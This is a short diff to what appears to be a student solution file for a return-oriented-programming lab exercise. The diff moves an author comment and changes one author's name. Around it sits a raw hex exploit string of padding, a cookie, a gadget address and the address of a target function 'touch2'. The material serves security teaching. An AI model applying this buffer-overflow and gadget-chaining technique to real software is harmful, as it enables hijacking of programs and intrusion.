@@ -1,3 +1,7 @@
+/*
+ * @author: Chuck Lugai
+ * @author: Omosh Otieno
+ */
 46 75 6e 20 69 73 6e 27
 74 20 73 74 68 20 6f 6e
 65 20 63 6f 6e 73 69 64
@@ -9,8 +13,3 @@
 e7 de 6a 27 00 00 00 00 /* cookie */
 5f 19 40 00 00 00 00 00 /* gadget 2 */
 cf 17 40 00 00 00 00 00 /* address of touch2 */
-
-/*
- * @author: Chuck Lugai
- * @author: Russell Otieno
- */
